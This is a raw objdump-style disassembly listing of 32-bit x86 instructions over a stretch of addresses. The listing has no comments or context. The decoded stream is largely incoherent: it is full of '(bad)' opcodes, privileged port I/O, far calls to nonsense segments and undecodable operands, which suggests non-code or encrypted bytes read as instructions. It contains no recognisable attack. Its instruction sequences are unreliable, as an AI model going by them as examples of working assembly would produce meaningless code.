  41f3f5:	sbb    ebx,DWORD PTR [ecx+0x2a265e8f]
  41f3fb:	ins    BYTE PTR es:[edi],dx
  41f3fc:	jo     0x41f40a
  41f3fe:	(bad)  
  41f3ff:	pop    edi
  41f400:	bound  eax,QWORD PTR [edx]
  41f402:	aas    
  41f403:	xchg   BYTE PTR [edi+0x4c7ca93e],cl
  41f409:	das    
  41f40a:	in     al,0xae
  41f40c:	xchg   ebp,eax
  41f40d:	adc    ecx,ebx
  41f40f:	int    0x60
  41f411:	loop   0x41f39a
  41f413:	jg     0x41f487
  41f415:	push   ebp
  41f416:	(bad)  
  41f418:	loope  0x41f42a
  41f41a:	sbb    bh,BYTE PTR [edx+eax*2-0x410df9a8]
  41f421:	cld    
  41f422:	dec    esp
  41f423:	or     DWORD PTR [edi],edi
  41f425:	push   ss
  41f426:	jne    0x41f407
  41f428:	ins    BYTE PTR es:[edi],dx
  41f429:	and    BYTE PTR [ebp-0x73091954],0x16
  41f430:	(bad)  
  41f431:	push   esi
  41f432:	mov    dh,0x50
  41f434:	mov    cl,0x79
  41f436:	pop    eax
  41f437:	adc    bl,BYTE PTR [edi+0x64faa35]
  41f43d:	retf   
  41f43e:	repz in al,0x31
  41f441:	icebp  
  41f442:	(bad)  
  41f443:	jbe    0x41f4bd
  41f445:	pop    ebx
  41f446:	fisub  DWORD PTR [edx]
  41f448:	push   eax
  41f449:	fisub  DWORD PTR [edi]
  41f44b:	pop    ss
  41f44c:	repnz xchg ebx,eax
  41f44e:	aad    0xd4
  41f450:	ficomp WORD PTR [ecx]
  41f452:	in     al,dx
  41f453:	nop
  41f454:	xor    al,0xce
  41f456:	stos   BYTE PTR es:[edi],al
  41f457:	lods   eax,DWORD PTR ds:[esi]
  41f458:	fsubr  QWORD PTR [edi-0x399d7f17]
  41f45e:	shl    BYTE PTR ds:0x92ce1107,1
  41f464:	ja     0x41f476
  41f466:	mov    ds:0xd334d02e,eax
  41f46b:	ds xchg dh,bh
  41f46e:	adc    dl,ch
  41f470:	and    BYTE PTR [eax-0x67b05f07],ch
  41f476:	pusha  
  41f477:	xor    al,0x7a
  41f479:	push   ds
  41f47a:	and    BYTE PTR [ecx+ecx*4+0x38d3df77],ah
  41f481:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f482:	cs push esi
  41f484:	mov    ebp,0x7b054187
  41f489:	cmp    eax,0xfa1ab92e
  41f48e:	loope  0x41f43e
  41f490:	fs ins BYTE PTR es:[edi],dx
  41f492:	sub    eax,0xfa574561
  41f497:	jl     0x41f456
  41f499:	call   0xf90e:0x3667c015
  41f4a0:	push   esp
  41f4a1:	(bad)  
  41f4a2:	lock cwde 
  41f4a4:	or     BYTE PTR [edx],cl
  41f4a6:	mov    dh,0x93
  41f4a8:	mov    ch,BYTE PTR gs:[ebx]
  41f4ab:	or     BYTE PTR [ebp+0x25],al
  41f4ae:	xchg   ebp,eax
  41f4af:	or     BYTE PTR [esi-0x68],ah
  41f4b2:	pop    esp
  41f4b3:	push   ss
  41f4b4:	cmp    eax,0x20dbfc12
  41f4b9:	xchg   ebx,eax
  41f4ba:	call   0xcea6:0xbd16c814
  41f4c1:	test   bl,al
  41f4c3:	repz repz jno 0x41f464
  41f4c7:	pop    ebx
  41f4c8:	cmp    al,0x56
  41f4ca:	cmp    eax,0xe6e05b69
  41f4cf:	call   0xdd67b015
  41f4d4:	dec    edi
  41f4d5:	shr    BYTE PTR [edx+0x815605e],1
  41f4db:	dec    esp
  41f4dc:	adc    DWORD PTR [edi+0x5ebb3eba],eax
  41f4e2:	shl    ebp,cl
  41f4e4:	fwait
  41f4e5:	mov    ds:0xaad3e3c,eax
  41f4ea:	xchg   ebx,eax
  41f4eb:	or     ah,BYTE PTR [ecx+0x41f2e8f6]
  41f4f1:	and    ebp,DWORD PTR [ecx]
  41f4f3:	ror    DWORD PTR [eax-0x739e8f2c],0xe3
  41f4fa:	jnp    0x41f571
  41f4fc:	dec    eax
  41f4fd:	(bad)  
  41f4fe:	mov    al,ds:0x950de3de
  41f503:	(bad)  
  41f504:	(bad)  
  41f505:	push   ss
  41f506:	in     eax,dx
  41f507:	adc    ebp,DWORD PTR [eax-0x3e]
  41f50a:	jmp    0x41f564
  41f50c:	mov    edx,0x42623f4e
  41f511:	out    dx,al
  41f512:	dec    ebx
  41f513:	and    bl,bh
  41f515:	fidiv  WORD PTR [esp+eax*4+0x30c2d218]
  41f51c:	mov    ecx,DWORD PTR [eax+0x17]
  41f51f:	xchg   ebp,eax
  41f520:	aad    0xf
  41f522:	push   eax
  41f523:	(bad)  
  41f524:	in     eax,dx
  41f525:	shr    DWORD PTR [esp],cl
  41f528:	inc    ebp
  41f529:	or     BYTE PTR [ebp-0x1e],bl
  41f52c:	sahf   
  41f52d:	aas    
  41f52e:	in     eax,dx
  41f52f:	pop    esi
  41f530:	jns    0x41f56c
  41f532:	jg     0x41f4bc
  41f534:	lahf   
  41f535:	rol    BYTE PTR [edi],0x6e
  41f538:	sbb    al,0x99
  41f53a:	mov    bl,0x29
  41f53c:	pop    ss
  41f53d:	jno    0x41f541
  41f53f:	aaa    
  41f540:	xor    DWORD PTR [ecx+0x15],ebx
  41f543:	mov    bh,0x40
  41f545:	add    ch,BYTE PTR ds:0x626cc68a
  41f54b:	call   0x20b98a6d
  41f550:	fistp  QWORD PTR [ebp+edx*8-0x64]
  41f554:	sahf   
  41f555:	inc    esp
  41f556:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f557:	mul    BYTE PTR [esi+ebx*1]
  41f55a:	ja     0x41f59e
  41f55c:	xchg   ebp,eax
  41f55d:	je     0x41f562
  41f55f:	sbb    ecx,DWORD PTR [edi]
  41f561:	sub    cl,dh
  41f563:	lods   al,BYTE PTR ds:[esi]
  41f564:	inc    eax
  41f565:	test   DWORD PTR [eax+edx*2-0x405994fe],0xc4d4d842
  41f570:	pop    ebx
  41f571:	sub    bh,al
  41f573:	loope  0x41f552
  41f575:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f576:	xor    esi,edi
  41f578:	adc    ebx,edx
  41f57a:	aam    0x91
  41f57c:	int3   
  41f57d:	arpl   sp,sp
  41f57f:	sub    al,dl
  41f581:	rol    BYTE PTR [edx-0x64],0xb6
  41f585:	leave  
  41f586:	mov    esi,DWORD PTR [eax+0x14f38a76]
  41f58c:	ins    DWORD PTR es:[edi],dx
  41f58d:	mov    DWORD PTR [ebx-0x51b0ae68],0xd378738c
  41f597:	ja     0x41f5b5
  41f599:	repz mov ebp,0x8833e9b6
  41f59f:	dec    esi
  41f5a0:	sbb    BYTE PTR [edx],0x9c
  41f5a3:	pop    eax
  41f5a4:	(bad)  
  41f5a5:	mov    dh,0x70
  41f5a7:	call   esp
  41f5a9:	inc    ebx
  41f5aa:	popa   
  41f5ab:	js     0x41f606
  41f5ad:	push   0x76bb4f7f
  41f5b2:	stc    
  41f5b3:	jg     0x41f631
  41f5b5:	xchg   edi,eax
  41f5b6:	jne    0x41f553
  41f5b8:	in     eax,dx
  41f5b9:	or     DWORD PTR [edx-0x50],edx
  41f5bc:	and    eax,0xdd86190f
  41f5c1:	push   edx
  41f5c2:	sbb    DWORD PTR [edx+0x37b438f4],0xa53e445e
  41f5cc:	je     0x41f568
  41f5ce:	loope  0x41f5fa
  41f5d0:	sbb    ecx,DWORD PTR [edx]
  41f5d2:	pusha  
  41f5d3:	sub    cl,BYTE PTR [ebx+0xb4a3dd8]
  41f5d9:	mov    dl,0xd8
  41f5db:	dec    edi
  41f5dc:	lock ds pop esi
  41f5df:	lock fidiv DWORD PTR [ebx+0x7f]
  41f5e3:	imul   eax,DWORD PTR [esp+edx*4+0x5bb83cec],0xa
  41f5eb:	sahf   
  41f5ec:	inc    DWORD PTR [ebp+0x54add304]
  41f5f2:	push   esp
  41f5f3:	and    eax,0xf4359039
  41f5f8:	cs mov al,0xd7
  41f5fb:	dec    esp
  41f5fc:	test   eax,0xfd02e501
  41f601:	dec    esp
  41f602:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f603:	pushw  ss
  41f605:	push   ecx
  41f606:	mov    ebx,0x19d6b0c1
  41f60b:	mov    eax,ds:0x15caf434
  41f610:	push   ebp
  41f611:	stc    
  41f612:	add    ecx,edi
  41f614:	jno    0x41f5b9
  41f616:	fnstcw WORD PTR [ebp+0x3ad8e87e]
  41f61c:	or     BYTE PTR [esi],0xd0
  41f61f:	ss pop ebx
  41f621:	mov    dl,0xb4
  41f623:	loope  0x41f5da
  41f625:	cmp    al,0xc3
  41f627:	or     eax,0xd5a19fad
  41f62c:	jp     0x41f5f6
  41f62e:	xor    eax,0xef6c9e39
  41f633:	ins    BYTE PTR es:[edi],dx
  41f634:	xchg   ebp,eax
  41f635:	je     0x41f628
  41f637:	int3   
  41f638:	or     DWORD PTR [ebp-0x7d],esp
  41f63b:	xor    al,al
  41f63d:	inc    eax
  41f63e:	push   ds
  41f63f:	ins    BYTE PTR es:[edi],dx
  41f640:	cdq    
  41f641:	call   0xa9b9:0xff05fcba
  41f648:	push   cs
  41f649:	bswap  esp
  41f64b:	push   ecx
  41f64c:	mov    ecx,0x142a98e5
  41f651:	and    DWORD PTR ds:0x27b64ba9,edi
  41f657:	fcmovnb st,st(5)
  41f659:	dec    eax
  41f65a:	aaa    
  41f65b:	sbb    eax,0x18262b27
  41f660:	fs gs and ah,al
  41f664:	ret    
  41f665:	add    al,BYTE PTR [esi+0x76545e73]
  41f66b:	push   esp
  41f66c:	and    al,0xdf
  41f66e:	aam    0x3b
  41f670:	xchg   edx,eax
  41f671:	sbb    ecx,esi
  41f673:	adc    edi,0x49e3c84d
  41f679:	xchg   ecx,eax
  41f67a:	mov    dh,cl
  41f67c:	mov    esp,0x2ba189f9
  41f681:	cs ss cmp ebx,edx
  41f685:	out    dx,eax
  41f686:	mov    esp,eax
  41f688:	mov    BYTE PTR [edi+eax*4-0x43],dl
  41f68c:	and    ah,BYTE PTR [eax-0x36]
  41f68f:	mov    ebx,0x888306ae
  41f694:	jg     0x41f632
  41f696:	push   ecx
  41f697:	iret   
  41f698:	add    BYTE PTR ds:0x21243e0,bh
  41f69e:	xchg   esi,eax
  41f69f:	xchg   cl,al
  41f6a1:	es (bad) 
  41f6a3:	mov    esi,0x91bc7916
  41f6a8:	pop    ds
  41f6a9:	adc    BYTE PTR [ebp-0x7c823a3c],ah
  41f6af:	or     DWORD PTR [edx+edx*1],0xfe5a428c
  41f6b6:	test   BYTE PTR [ecx-0x22],0xef
  41f6ba:	pop    ss
  41f6bb:	mov    BYTE PTR [ecx-0x35407f60],0xb5
  41f6c2:	outs   dx,BYTE PTR es:[esi]
  41f6c4:	out    dx,al
  41f6c5:	and    al,0x9d
  41f6c7:	xchg   edx,eax
  41f6c8:	icebp  
  41f6c9:	dec    esp
  41f6ca:	and    BYTE PTR [esi],ch
  41f6cc:	cmp    esi,0x2038d3ab
  41f6d2:	inc    ebx
  41f6d3:	ds clc 
  41f6d5:	push   cs
  41f6d6:	in     al,dx
  41f6d7:	fsub   DWORD PTR [edx+0x2c]
  41f6da:	lock outs dx,DWORD PTR ds:[esi]
  41f6dc:	int    0x98
  41f6de:	sti    
  41f6df:	xchg   DWORD PTR [ecx+0xbe1f1bf],esp
  41f6e5:	jge    0x41f6b7
  41f6e7:	inc    ebp
  41f6e8:	sub    cl,BYTE PTR [edx-0x43]
  41f6eb:	neg    DWORD PTR [ecx-0x76]
  41f6ee:	mov    ebp,0xc1effd33
  41f6f3:	nop
  41f6f4:	or     ecx,DWORD PTR [ecx]
  41f6f6:	(bad)  
  41f6f7:	cmp    al,0x2d
  41f6f9:	jl     0x41f6a0
  41f6fb:	hlt    
  41f6fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f6fd:	xor    DWORD PTR [edx-0x42ee2e6d],ebx
  41f703:	sahf   
  41f704:	adc    edi,0x5
  41f707:	fwait
  41f708:	nop
  41f709:	jnp    0x41f785
  41f70b:	pop    ecx
  41f70c:	scas   al,BYTE PTR es:[edi]
  41f70d:	mov    dl,0x71
  41f70f:	loop   0x41f788
  41f711:	mov    bl,0x72
  41f713:	data16 jge 0x41f6f3
  41f716:	push   es
  41f717:	cmp    DWORD PTR [ecx+0x77bd102e],edx
  41f71d:	pop    ecx
  41f71e:	and    dh,BYTE PTR [eax]
  41f720:	push   ebp
  41f721:	clc    
  41f722:	jo     0x41f727
  41f724:	cs jne 0x41f71e
  41f727:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f728:	mov    ah,0x2d
  41f72a:	pop    ebp
  41f72b:	imul   esi,DWORD PTR ds:0xe3cd7b4c,0xffffffb9
  41f732:	cmp    ebx,DWORD PTR [esi+0x64]
  41f735:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f736:	adc    eax,0x31d07ae1
  41f73b:	xchg   ebp,eax
  41f73c:	aad    0xc8
  41f73e:	mov    ds:0xdfdb07b1,al
  41f743:	inc    esp
  41f744:	aad    0xf
  41f746:	xor    esi,ebx
  41f748:	lahf   
  41f749:	rol    DWORD PTR [edx+0x41],1
  41f74c:	jg     0x41f71e
  41f74e:	ins    DWORD PTR es:[edi],dx
  41f74f:	push   0x61
  41f751:	xor    eax,0xb1fba72e
  41f756:	and    ch,BYTE PTR [ebp+0x5f]
  41f759:	stos   BYTE PTR es:[edi],al
  41f75a:	pop    edx
  41f75b:	sbb    BYTE PTR [esp+eiz*4-0x551c1cac],ah
  41f762:	inc    edi
  41f763:	pop    eax
  41f764:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  41f766:	les    esi,FWORD PTR [ebx]
  41f768:	mov    dl,BYTE PTR [ecx]
  41f76a:	lods   al,BYTE PTR ds:[esi]
  41f76b:	ss push ebx
  41f76d:	aas    
  41f76e:	call   0xcb4d82e4
  41f773:	jp     0x41f7e6
  41f775:	and    al,0x4b
  41f777:	adc    DWORD PTR [ebx],ecx
  41f779:	ss loopne 0x41f75b
  41f77c:	mov    edi,0xfbe6fef2
  41f781:	ss sahf 
  41f783:	mov    eax,ds:0x50b06e1b
  41f788:	adc    BYTE PTR [ecx+0x51bf4915],ah
  41f78e:	(bad)
  41f791:	shr    ah,0xfb
  41f794:	out    dx,eax
  41f795:	sub    dh,BYTE PTR ds:[ecx+0x17]
  41f799:	scas   al,BYTE PTR es:[edi]
  41f79a:	dec    edx
  41f79b:	pop    edi
  41f79c:	pushf  
  41f79d:	hlt    
  41f79e:	sub    BYTE PTR [ebx+0xf405d1d],ah
  41f7a4:	inc    ebx
  41f7a5:	or     al,0xc5
  41f7a7:	cmp    al,0xb8
  41f7a9:	test   eax,0xc3ed0d83
  41f7ae:	repnz xchg ecx,eax
  41f7b0:	in     al,dx
  41f7b1:	mov    ebp,0x18a84a0
  41f7b6:	scas   al,BYTE PTR es:[edi]
  41f7b7:	nop
  41f7b8:	jbe    0x41f73a
  41f7ba:	das    
  41f7bb:	(bad)  
  41f7bc:	lahf   
  41f7bd:	iret   
  41f7be:	mov    ecx,0xfd3529a5
  41f7c3:	inc    edx
  41f7c4:	mov    dh,0x39
  41f7c6:	mov    al,0x35
  41f7c8:	inc    esp
  41f7c9:	enter  0x274d,0x39
  41f7cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f7ce:	fstp   DWORD PTR [ebp-0x5b]
  41f7d1:	stos   DWORD PTR es:[edi],eax
  41f7d2:	xchg   ebp,eax
  41f7d3:	fwait
  41f7d4:	mov    dl,0xbd
  41f7d6:	xchg   BYTE PTR [edi-0x8],al
  41f7d9:	sar    BYTE PTR [ecx],1
  41f7db:	fistp  QWORD PTR [ebx]
  41f7dd:	imul   edi,DWORD PTR [esi],0x7f
  41f7e0:	pop    eax
  41f7e1:	mov    eax,ds:0x659aad28
  41f7e6:	stc    
  41f7e7:	mov    eax,ds:0x1c45430f
  41f7ec:	sahf   
  41f7ed:	sub    eax,DWORD PTR [edx-0xf]
  41f7f0:	mov    al,ds:0x26230d87
  41f7f5:	retf   
  41f7f6:	aaa    
  41f7f7:	fistp  DWORD PTR [ecx+0x63209bb1]
  41f7fd:	neg    BYTE PTR [edi+ecx*1]
  41f800:	leave  
  41f801:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f802:	mov    al,0x28
  41f804:	test   al,0x2a
  41f806:	fsubrp st(2),st
  41f808:	cs pop edx
  41f80a:	mov    esi,0xce252b49
  41f80f:	repz dec edi
  41f811:	add    BYTE PTR [ebx-0x7a],dl
  41f814:	xchg   ebp,eax
  41f815:	arpl   WORD PTR [edi+0x7eb0e737],sp
  41f81b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f81c:	xchg   edi,eax
  41f81d:	int    0x5
  41f81f:	retf   0x8b4
  41f822:	rol    BYTE PTR [ecx-0x56],1
  41f825:	daa    
  41f826:	fs jge 0x41f830
  41f829:	jne    0x41f7e6
  41f82b:	cmp    ah,cl
  41f82d:	dec    eax
  41f82e:	(bad)
  41f832:	out    0xd6,al
  41f834:	add    DWORD PTR [ebx+0x17],0xffffffc3
  41f838:	ja     0x41f820
  41f83a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f83b:	add    DWORD PTR [ebx+esi*1+0x68],ebx
  41f83f:	daa    
  41f840:	mov    ah,0x63
  41f842:	scas   al,BYTE PTR es:[edi]
  41f843:	push   esp
  41f844:	add    BYTE PTR [esi-0x42],bh
  41f847:	out    dx,al
  41f848:	jecxz  0x41f841
  41f84a:	ds or  al,0xb4
  41f84d:	jne    0x41f7f7
  41f84f:	loope  0x41f87e
  41f851:	ret    0x28f6
  41f854:	icebp  
  41f855:	call   0x86be148e
  41f85a:	adc    al,0x41
  41f85c:	mov    ebx,0xbe0157a7
  41f861:	fsubr  QWORD PTR [ebp+ebp*4+0x664d7831]
  41f868:	in     al,dx
  41f869:	or     bh,BYTE PTR [esi+0x6c1ccc59]
  41f86f:	cmp    bh,BYTE PTR [eax]
  41f871:	sub    eax,0xe710f95b
  41f876:	push   esp
  41f877:	jle    0x41f869
  41f879:	stos   BYTE PTR es:[edi],al
  41f87a:	es in  eax,dx
  41f87c:	sbb    bh,BYTE PTR [eax+edx*2]
  41f87f:	stos   DWORD PTR es:[edi],eax
  41f880:	outs   dx,DWORD PTR ds:[esi]
  41f881:	outs   dx,BYTE PTR ds:[esi]
  41f882:	mov    ebx,0x44335540
  41f887:	cld    
  41f888:	js     0x41f80e
  41f88a:	inc    esp
  41f88b:	fcmovnbe st,st(5)
  41f88d:	push   ss
  41f88e:	(bad)  [eax+0x56]
  41f891:	loope  0x41f8cc
  41f893:	push   0x23528be7
  41f898:	inc    ebx
  41f899:	int3   
  41f89a:	mov    edx,0x86de0df8
  41f89f:	loope  0x41f82d
  41f8a1:	lds    eax,FWORD PTR fs:0x635b0ae1
  41f8a8:	fdivr  QWORD PTR [ebx]
  41f8aa:	pop    ecx
  41f8ab:	or     eax,DWORD PTR [ebp+ebp*2+0x44]
  41f8af:	cmp    DWORD PTR [edi-0x5d68c1e6],esp
  41f8b5:	pop    edx
  41f8b6:	mov    ds:0x3a4f6fa9,eax
  41f8bb:	jecxz  0x41f893
  41f8bd:	shl    DWORD PTR [edx],1
  41f8bf:	stos   BYTE PTR es:[edi],al
  41f8c0:	sub    BYTE PTR [ebp+0x30],bl
  41f8c3:	repz push ss
  41f8c5:	arpl   WORD PTR ds:0xcffd8065,ax
  41f8cb:	sbb    eax,0x103c80a4
  41f8d0:	(bad)  
  41f8d1:	out    0xac,al
  41f8d3:	sbb    bh,BYTE PTR [ebp+0x6baec2a8]
  41f8d9:	hlt    
  41f8da:	jno    0x41f88d
  41f8dc:	inc    eax
  41f8dd:	cmp    eax,0x8dfd64dc
  41f8e2:	jno    0x41f926
  41f8e4:	inc    esi
  41f8e5:	jl     0x41f885
  41f8e7:	or     eax,0xf770a571
  41f8ec:	inc    eax
  41f8ed:	pushf  
  41f8ee:	mov    eax,ds:0x2d460edd
  41f8f3:	add    DWORD PTR [esi],0x87c82332
  41f8f9:	xlat   BYTE PTR ds:[ebx]
  41f8fa:	pop    ebp
  41f8fb:	pop    ss
  41f8fc:	mov    eax,0xca45cddf
  41f901:	mov    edx,0xf620a25e
  41f906:	and    al,0xe8
  41f908:	pop    ecx
  41f909:	int3   
  41f90a:	mov    cl,0xa2
  41f90c:	(bad)  
  41f90e:	rcl    ebx,1
  41f910:	call   0xcfdceacf
  41f915:	out    0x79,al
  41f917:	push   ds
  41f918:	jbe    0x41f937
  41f91a:	out    0x13,eax
  41f91c:	and    eax,0x7699e5f4
  41f921:	fstp   st(6)
  41f923:	and    al,0xd
  41f925:	mov    ah,0xe0
  41f927:	into   
  41f928:	shl    BYTE PTR [esi],1
  41f92a:	xor    ch,BYTE PTR [edx-0x35]
  41f92d:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  41f92f:	aam    0x48
  41f931:	stos   BYTE PTR es:[edi],al
  41f932:	cwde   
  41f933:	mov    ?,WORD PTR [ecx+edi*8-0x60]
  41f937:	std    
  41f938:	icebp  
  41f939:	add    esp,DWORD PTR [edx-0x16]
  41f93c:	call   0x1101:0xd458d881
  41f943:	in     al,0x4d
  41f945:	xlat   BYTE PTR ds:[ebx]
  41f946:	cmp    al,0xd0
  41f948:	sub    BYTE PTR ds:0x9984d5a1,dl
  41f94e:	mov    ebp,0x79fc8f56
  41f953:	mov    ?,WORD PTR [edi-0x54]
  41f956:	pusha  
  41f957:	(bad)  
  41f958:	stc    
  41f959:	ins    BYTE PTR es:[edi],dx
  41f95a:	rcr    al,1
  41f95c:	(bad)  
  41f95e:	mov    dh,0xdf
  41f960:	pop    eax
  41f961:	mov    ah,0xbb
  41f963:	outs   dx,DWORD PTR ds:[esi]
  41f964:	out    dx,eax
  41f965:	test   eax,0xa15a2b6
  41f96a:	lds    edi,FWORD PTR [eax]
  41f96c:	sub    al,BYTE PTR [ecx+0x531106a7]
  41f972:	push   esi
  41f973:	inc    ebp
  41f974:	adc    ah,BYTE PTR [eax-0x5263fec5]
  41f97a:	call   0xf643d9d7
  41f97f:	pop    edx
  41f980:	ja     0x41f957
  41f982:	shl    dl,cl
  41f984:	add    eax,0x92c84e13
  41f989:	std    
  41f98a:	mov    cl,0x2a
  41f98c:	pop    edi
  41f98d:	jl     0x41f986
  41f98f:	jg     0x41fa04
  41f991:	scas   al,BYTE PTR es:[edi]
  41f992:	and    eax,0x96b6c5da
  41f997:	sti    
  41f998:	adc    ah,BYTE PTR ds:0xa9bf8df8
  41f99e:	loop   0x41f991
  41f9a0:	(bad)  
  41f9a1:	sti    
  41f9a2:	cmp    al,0x9a
  41f9a4:	mov    ch,0xd8
  41f9a6:	inc    esi
  41f9a7:	aam    0x3d
  41f9a9:	shr    BYTE PTR [ecx+0xc],1
  41f9ac:	sub    edx,ecx
  41f9ae:	mov    bh,0x20
  41f9b0:	push   ss
  41f9b1:	mov    ch,0x17
  41f9b3:	sbb    eax,0xf8025d51
  41f9b8:	in     eax,dx
  41f9b9:	rol    BYTE PTR [edi+ecx*8],0xda
  41f9bd:	push   esp
  41f9be:	inc    ch
  41f9c0:	cs loopne 0x41fa36
  41f9c3:	(bad)  
  41f9c4:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  41f9c6:	aaa    
  41f9c7:	pop    esi
  41f9c8:	lahf   
  41f9c9:	mov    al,0x4a
  41f9cb:	dec    eax
  41f9cc:	xlat   BYTE PTR ds:[ebx]
  41f9cd:	cli    
  41f9ce:	loopne 0x41f9d3
  41f9d0:	pushf  
  41f9d1:	cmp    al,0xb9
  41f9d3:	and    BYTE PTR [ebp-0x3e],bl
  41f9d6:	pop    ebx
  41f9d7:	mov    al,ds:0x8687c168
  41f9dc:	int    0xff
  41f9de:	push   ds
  41f9df:	cvtpi2ps xmm2,QWORD PTR [ecx-0x487b7b9f]
  41f9e6:	pop    es
  41f9e7:	sbb    eax,0xdc27f0ee
  41f9ec:	inc    esi
  41f9ed:	out    dx,al
  41f9ee:	dec    ebx
  41f9ef:	pop    ebx
  41f9f0:	add    DWORD PTR [ecx],esp
  41f9f2:	pop    ebx
  41f9f3:	sahf   
  41f9f4:	jg     0x41fa72
  41f9f6:	xor    dl,cl
  41f9f8:	push   0xe
  41f9fa:	sbb    DWORD PTR [ecx+ebx*1-0x77a685fa],ebx
  41fa01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fa02:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fa03:	lea    esp,[ecx+0x306ced27]
  41fa09:	(bad)  
  41fa0a:	add    DWORD PTR [edx+eax*1+0x34],eax
  41fa0e:	fcomi  st,st(2)
  41fa10:	sub    eax,0x9a3b67ec
  41fa15:	addr16 test al,0xaa
  41fa18:	stos   DWORD PTR es:[edi],eax
  41fa19:	jmp    0x8117:0xbd617a14
  41fa20:	(bad)  
  41fa21:	xchg   ebp,eax
  41fa22:	xchg   edx,eax
  41fa23:	stos   BYTE PTR es:[edi],al
  41fa24:	cdq    
  41fa25:	jns    0x41fa0c
  41fa27:	je     0x41fa3c
  41fa29:	fdiv   DWORD PTR [ecx-0x1e]
  41fa2c:	in     eax,dx
  41fa2d:	sbb    ah,0x2f
  41fa30:	cmc    
  41fa31:	shr    DWORD PTR [edx-0x70],0xec
  41fa35:	cmp    eax,0x3f4f1909
  41fa3a:	xchg   ebp,eax
  41fa3b:	clc    
  41fa3c:	add    edi,ecx
  41fa3e:	xchg   esp,eax
  41fa3f:	shl    BYTE PTR [edi],1
  41fa41:	sbb    al,0xbf
  41fa43:	repz mov ds:0x534e4134,eax
  41fa49:	shl    esi,0x1b
  41fa4c:	xchg   esp,eax
  41fa4d:	xchg   ebp,eax
  41fa4e:	mov    ch,0x14
  41fa50:	ins    BYTE PTR es:[edi],dx
  41fa51:	mov    WORD PTR [ecx-0x4bb9bc58],cs
  41fa57:	and    dl,BYTE PTR [ebp+0x6b]
  41fa5a:	jae    0x41fa52
  41fa5c:	lahf   
  41fa5d:	lods   eax,DWORD PTR ds:[esi]
  41fa5e:	jne    0x41f9f3
  41fa60:	ss (bad) 
  41fa62:	shr    DWORD PTR [eax+0x6c],1
  41fa65:	mov    dl,0xab
  41fa67:	loope  0x41faa0
  41fa69:	repz sbb dh,BYTE PTR [ecx]
  41fa6c:	mov    cl,0xb
  41fa6e:	int3   
  41fa6f:	sbb    bh,dl
  41fa71:	fwait
  41fa72:	xor    dl,al
  41fa74:	and    DWORD PTR [ebx-0x418650d],ecx
  41fa7a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fa7b:	jmp    0xcb6:0x7ecd5e2b
  41fa82:	sub    esp,DWORD PTR [edi+0x19]
  41fa85:	xor    BYTE PTR [edi+0x6ad817da],0x18
  41fa8c:	xor    eax,0x761facff
  41fa91:	jae    0x41fa81
  41fa93:	lock mov eax,ds:0x59d3c47a
  41fa99:	push   edx
  41fa9a:	pop    ds
  41fa9b:	sti    
  41fa9c:	sahf   
  41fa9d:	or     esp,DWORD PTR [ebp+0x32]
  41faa0:	push   eax
  41faa1:	lods   al,BYTE PTR ds:[esi]
  41faa2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41faa3:	rcr    DWORD PTR [ebx-0x18],0x3a
  41faa7:	push   ebx
  41faa8:	pop    edi
  41faa9:	imul   eax,DWORD PTR [ebp+0x674a288d],0x29e75921
  41fab3:	mov    ebp,0x3b27a457
  41fab8:	dec    BYTE PTR [ecx]
  41faba:	adc    ch,bl
  41fabc:	pop    esp
  41fabd:	xchg   BYTE PTR [edi+0x3],dh
  41fac0:	outs   dx,BYTE PTR ds:[esi]
  41fac1:	sar    BYTE PTR ds:0xdfb001b2,0x68
  41fac8:	push   ss
  41fac9:	cmp    DWORD PTR [esi-0xb],esi
  41facc:	(bad)  
  41facd:	mov    ecx,0xc4f1e8ed
  41fad2:	aaa    
  41fad3:	call   0x43a929e3
  41fad8:	nop
  41fad9:	xchg   ebx,eax
  41fada:	std    
  41fadb:	mov    eax,ds:0xfde3b358
  41fae0:	and    ebp,DWORD PTR [edx-0x6f]
  41fae3:	push   esi
  41fae4:	add    al,0xcd
  41fae6:	mov    bl,0x48
  41fae8:	outs   dx,DWORD PTR ds:[esi]
  41fae9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41faea:	push   ds
  41faeb:	scas   al,BYTE PTR es:[edi]
  41faec:	mov    eax,ds:0xbc372221
  41faf1:	dec    ebp
  41faf2:	test   eax,0x1bd1ec48
  41faf7:	mov    edi,0xff385e91
  41fafc:	mov    cl,0x71
  41fafe:	jmp    0x47b6acbe
  41fb03:	(bad)  
  41fb04:	sub    edi,esp
  41fb06:	test   BYTE PTR [edx+ecx*4],bh
  41fb09:	lods   ax,WORD PTR ds:[esi]
  41fb0b:	xor    al,cl
  41fb0d:	fisttp QWORD PTR [esi+0x59]
  41fb10:	jne    0x41faf2
  41fb12:	retf   0x5474
  41fb15:	add    dh,dl
  41fb17:	push   ds
  41fb18:	jo     0x41fb0e
  41fb1a:	cs imul bh
  41fb1d:	inc    DWORD PTR [esi+0x5d489917]
  41fb23:	repz pop ecx
  41fb25:	ins    DWORD PTR es:[edi],dx
  41fb26:	mov    ebx,0x536d5805
  41fb2b:	in     al,dx
  41fb2c:	pusha  
  41fb2d:	adc    eax,0x36ba5366
  41fb32:	hlt    
  41fb33:	jmp    0xdb59:0x738e250f
  41fb3a:	cs xor al,0xca
  41fb3d:	dec    edi
  41fb3e:	clc    
  41fb3f:	lahf   
  41fb40:	and    al,0xde
  41fb42:	scas   eax,DWORD PTR es:[edi]
  41fb43:	sbb    BYTE PTR [ebp+0x17ace25f],cl
